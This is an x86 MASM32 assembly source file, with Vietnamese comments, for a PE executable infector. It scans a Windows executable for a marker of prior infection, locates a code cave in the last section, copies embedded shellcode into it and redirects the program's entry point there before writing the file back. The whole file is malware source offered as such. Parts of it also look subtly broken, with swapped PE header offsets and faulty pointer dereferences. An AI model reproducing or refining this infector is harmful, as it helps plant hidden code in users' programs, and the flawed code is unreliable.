; injector_masm32.asm

.386
.model flat, stdcall
option casemap:none

include \masm32\include\windows.inc
include \masm32\include\kernel32.inc
include \masm32\include\masm32.inc
include \masm32\include\user32.inc
includelib \masm32\lib\kernel32.lib
includelib \masm32\lib\masm32.lib
includelib \masm32\lib\user32.lib

include shellcode.inc

.DATA
filename         db MAX_PATH dup(0)
bufferPtr        dd ?
fileSize         dd ?
bytesRead        dd ?
isPE32           dd 0
isPE64           dd 0
e_lfanew         dd ?
imageBase        dd ?
entryRVA         dd ?
sigFound         dd 0
rawCaveOffset    dd 0
virtCaveAddr     dd 0
finalShellSize   dd 0
finalShellPtr    dd ?

.CODE

start:
    invoke GetModuleFileNameA, NULL, addr filename, MAX_PATH
    ; Inject chính file đang chạy
    push offset filename
    call injectFile
    invoke ExitProcess, 0

injectFile PROC uses ebx esi edi filename:DWORD
    LOCAL hFile:DWORD, bytesRead:DWORD, dosHeader:DWORD, ntHeader:DWORD
    LOCAL fileBuffer:DWORD

    ; Mở file
    invoke CreateFileA, filename, GENERIC_READ or GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL
    mov hFile, eax
    cmp eax, INVALID_HANDLE_VALUE
    je error

    ; Kích thước file
    invoke GetFileSize, hFile, NULL
    mov fileSize, eax

    ; Cấp phát bộ nhớ
    invoke GlobalAlloc, GMEM_FIXED, eax
    mov fileBuffer, eax

    ; Đọc vào buffer
    invoke ReadFile, hFile, fileBuffer, fileSize, addr bytesRead, NULL
    invoke CloseHandle, hFile

    ; Kiểm tra MZ
    mov ax, WORD PTR [fileBuffer]
    cmp ax, 'MZ'
    jne error

    ; e_lfanew
    mov eax, DWORD PTR [fileBuffer+3Ch]
    mov e_lfanew, eax
    add eax, fileBuffer
    mov ntHeader, eax

    ; PE signature
    cmp DWORD PTR [eax], 00004550h
    jne error

    ; Magic
    mov ax, WORD PTR [eax+18h]
    cmp ax, 010Bh
    je pe32
    cmp ax, 020Bh
    je pe64
    jmp error

pe32:
    mov isPE32, 1
    jmp check_shellcode

pe64:
    mov isPE64, 1

check_shellcode:
    ; Kiểm tra signature
    .if isPE32
        mov esi, fileBuffer
        mov ecx, fileSize
        mov edi, offset sig32
        mov edx, 8
    .else
        mov esi, fileBuffer
        mov ecx, fileSize
        mov edi, offset sig64
        mov edx, 8
    .endif

scan_sig:
    cmp ecx, edx
    jl no_sig
    push ecx esi edi edx
    push edx
    call CompareMemory
    add esi, 1
    pop edx edi esi ecx
    test eax, eax
    jnz found_sig
    sub ecx, 1
    jmp scan_sig

found_sig:
    mov sigFound, 1
    jmp skip_injection

no_sig:
    ; OK tiếp tục inject

    ; Lấy EntryPoint & ImageBase
    .if isPE32
        mov eax, ntHeader
        mov ebx, [eax+34h]    ; EntryPoint RVA
        mov entryRVA, ebx
        mov eax, [eax+1Ch]    ; ImageBase
        mov imageBase, eax
    .else
        mov eax, ntHeader
        mov ebx, [eax+40h]    ; EntryPoint RVA
        mov entryRVA, ebx
        mov eax, [eax+18h]    ; ImageBase (QWORD)
        mov imageBase, eax
    .endif

    ; Tìm last section
    mov ecx, [ntHeader+6] ; NumberOfSections
    movzx edx, WORD PTR [ntHeader+20h] ; SizeOfOptionalHeader
    lea eax, [ntHeader + 24h + edx]
    mov esi, eax
    dec ecx
    imul ecx, 28h
    add esi, ecx  ; esi = last section header

    ; Tìm code cave
    mov ebx, [esi+14h] ; raw pointer
    mov ecx, [esi+10h] ; raw size
    xor edi, edi
find_cave:
    cmp ecx, 400h
    jl fail
    cmp BYTE PTR [fileBuffer+ebx+edi], 0
    jne next_byte
    mov eax, 0
    mov edx, 400h
    repe scasb
    sub edi, edx
    cmp edi, 400h
    jl next_byte
    ; tìm được cave
    add ebx, edi
    mov rawCaveOffset, ebx
    mov eax, [esi+0Ch]
    add eax, edi
    add eax, imageBase
    mov virtCaveAddr, eax
    jmp patch_entry

next_byte:
    inc edi
    dec ecx
    jmp find_cave

patch_entry:
    ; Ghi shellcode
    .if isPE32
        mov ecx, BASE_SHELL32_SIZE
        mov finalShellSize, ecx
        mov edi, fileBuffer
        add edi, rawCaveOffset
        mov esi, offset BaseShell32
        rep movsb
    .else
        mov ecx, BASE_SHELL64_SIZE
        mov finalShellSize, ecx
        mov edi, fileBuffer
        add edi, rawCaveOffset
        mov esi, offset BaseShell64
        rep movsb
    .endif

    ; Ghi EntryPoint mới
    mov eax, virtCaveAddr
    sub eax, imageBase
    .if isPE32
        mov [ntHeader+34h], eax
    .else
        mov [ntHeader+40h], eax
    .endif

    ; Ghi file lại
skip_injection:
    invoke CreateFileA, filename, GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL
    mov hFile, eax
    invoke WriteFile, hFile, fileBuffer, fileSize, addr bytesRead, NULL
    invoke CloseHandle, hFile
    invoke GlobalFree, fileBuffer
    ret

fail:
error:
    invoke MessageBoxA, 0, chr$("Injection failed"), chr$("Error"), MB_OK
    ret

injectFile ENDP

CompareMemory PROC p1:DWORD, p2:DWORD, len:DWORD
    push esi
    push edi
    mov esi, p1
    mov edi, p2
    mov ecx, len
    repe cmpsb
    je matched
    xor eax, eax
    jmp done_cmp
matched:
    mov eax, 1

done_cmp:
    pop edi
    pop esi
    ret
CompareMemory ENDP

END start
